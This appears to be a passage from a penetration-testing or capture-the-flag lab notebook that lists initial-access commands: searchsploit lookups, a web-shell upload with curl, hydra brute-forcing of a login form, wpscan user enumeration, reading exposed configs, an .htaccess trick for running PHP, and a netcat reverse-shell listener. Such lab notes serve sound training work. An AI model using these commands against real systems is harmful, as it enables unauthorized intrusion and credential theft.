## 🔓 Initial Access (Machines 101–110)

### Common Web Exploits
```bash
# Exploiting known CMS or application vulnerabilities
searchsploit wordpress
searchsploit drupal

# Exploiting file upload vulnerability
curl -F "file=@shell.php" http://<IP>/upload
```

### Password Attacks
```bash
# Brute-force login forms
hydra -l admin -P rockyou.txt http://<IP>/login.php http-post-form "username=^USER^&password=^PASS^:Invalid password"

# WordPress specific
wpscan --url http://<IP> --enumerate u
```

### Exploiting Exposed Configs
```bash
# Reading exposed configuration files
curl http://<IP>/config.php
```

### Exploiting Default Credentials
```bash
# Try services with common credentials
telnet <IP>
ftp <IP>
ssh user@<IP>
```

### Uploading and Triggering Shells
```bash
# Using .htaccess tricks for Apache
echo "AddType application/x-httpd-php .txt" > .htaccess
mv shell.php shell.txt

# Trigger reverse shell
nc -lvnp 4444
```

### Summary
- Used Drupalgeddon2 to gain shell via POST exploit  
- Gained access using exposed credentials found in wp-config.php  
- Exploited upload bypass to get reverse shell on server